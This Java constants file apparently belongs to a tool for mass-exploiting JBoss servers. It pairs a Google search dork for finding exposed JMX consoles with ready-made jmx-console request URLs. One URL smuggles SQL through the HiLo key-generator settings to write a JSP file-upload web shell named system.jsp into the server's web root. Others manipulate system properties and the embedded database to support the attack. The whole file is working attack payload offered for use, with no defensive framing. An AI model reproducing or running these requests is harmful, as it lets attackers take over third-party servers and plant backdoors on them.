package cn.geniusman.constant;

public class Constant {

	public static final int HTTP_SOCKET_TIMEOUT = 150000;
	public static final int HTTP_POST_TIMEOUT = 2000;

	public static final int THREAD_NUMBER = 10;
	// private static final String KEY_WORD =
	// "allinurl:+%2Fco/jmx-console%2FHtmlAdaptor?";
	private static final String KEY_WORD = "intitle:%22MBean+Inspector%22";
	private static final int NUM_PER_PAGE = 100;
	public static final String SEARCH_URL = "http://www.google.com.tw/search?num="
			+ NUM_PER_PAGE + "&newwindow=1&q=" + KEY_WORD + "&sa=N";

	public static final String FIND_JBOSS_HOME_URL = "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss%3Atype%3DService%2Cname%3DSystemProperties&methodIndex=1&arg0=jboss.home.dir";

	public static final String SET_JBOSS_HOME_URL = "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss%3Atype%3DService%2Cname%3DSystemProperties&methodIndex=12&arg0=jboss.server.data.dir&arg1=";
	public static final String START_LOCAL_DB_URL = "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss%253Aservice%253DHypersonic%252Cdatabase%253DlocalDB&methodIndex=1";
	public static final String STOP_LOCAL_DB_URL = "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss%253Aservice%253DHypersonic%252Cdatabase%253DlocalDB&methodIndex=4";

	public static final String HILO_APPLY_URL = "/jmx-console/HtmlAdaptor?action=updateAttributes&name=jboss%3Aservice%3DKeyGeneratorFactory%2Ctype%3DHiLo&DropTable=True&SelectHiSql=null&IdColumnName=HIGHVALUES&BlockSize=10&DataSource=jboss.jca%3Aservice%3DDataSourceBinding%2Cname%3DDefaultDS&CreateTable=True&SequenceName=general&CreateTableDdl=create+table+HILOSEQUENCES+%28SEQUENCENAME+varchar%2850%29+not+null%2C+HIGHVALUES+integer+not+null%2C+constraint+hilo_pk+primary+key+%28SEQUENCENAME%29%29%3Bdrop+table+myfile1+IF+EXISTS%3Bcreate+text+table+myfile1+%28field1+varchar%2810%29%29%3BSET+TABLE+myfile1+SOURCE+%22system.jsp%3Bfs%3D%5C%5C%3Ball_quoted%3Dfalse%3Bquoted%3Dfalse%22%3Binsert+into+myfile1%28field1%29+values%28%27%3C%25%40+page+language%3D%22java%22+pageEncoding%3D%22gbk%22%25%3E%3Cjsp%3Adirective.page+import%3D%22java.io.File%22%2F%3E%3Cjsp%3Adirective.page+import%3D%22java.io.OutputStream%22%2F%3E%3Cjsp%3Adirective.page+import%3D%22java.io.FileOutputStream%22%2F%3E%3Chtml%3E%3Chead%3E%3Ctitle%3Ecode%3C%2Ftitle%3E%3Cmeta+http-equiv%3D%22keywords%22+content%3D%22code%22%3E%3Cmeta+http-equiv%3D%22description%22+content%3D%22code%22%3E%3C%2Fhead%3E%3C%25int+i%3D0%3BString+method%3Drequest.getParameter%28%22act%22%29%3Bif%28method%21%3Dnull%26%26method.equals%28%22up%22%29%29%7BString+url%3Drequest.getParameter%28%22url%22%29%3BString+text%3Drequest.getParameter%28%22text%22%29%3BFile+f%3Dnew+File%28url%29%3Bif%28f.exists%28%29%29%7Bf.delete%28%29%3B%7Dtry%7BOutputStream+o%3Dnew+FileOutputStream%28f%29%3Bo.write%28text.getBytes%28%29%29%3Bo.close%28%29%3B%7Dcatch%28Exception+e%29%7Bi%2B%2B%3B%25%3Eupload+unsuccessful%3C%25%7D%7Dif%28i%3D%3D0%29%7B%25%3Eupload+successful%3C%25%7D%25%3E%3Cbody%3E%3Cform+action%3D%22%3Fact%3Dup%22+method%3D%22post%22%3E%3Cinput+size%3D%22100%22+value%3D%22%3C%25%3Dapplication.getRealPath%28%22%2F%22%29+%25%3E%22+name%3D%22url%22%3E%3Cbr%3E%3Ctextarea+rows%3D%2220%22+cols%3D%2280%22+name%3D%22text%22%3Ecode%3C%2Ftextarea%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+value%3D%22up%22+name%3D%22text%22%2F%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E%27%29%3Bcommit%3B&FactoryName=HiLoKeyGeneratorFactory&SequenceColumn=SEQUENCENAME&TableName=HILOSEQUENCES";
	public static final String START_HILO_URL = "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss%253Aservice%253DKeyGeneratorFactory%252Ctype%253DHiLo&methodIndex=1";
	public static final String STOP_HILO_URL = "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss%253Aservice%253DKeyGeneratorFactory%252Ctype%253DHiLo&methodIndex=3";

	public static final String FILE_PREFIX = "file:";
	public static final String DEFAULT_JBOSS_FOLDER = "/server/default/deploy/ROOT.war/localDB;file=";

	public static final String LAST_JSP_NAME = "/system.jsp";

}
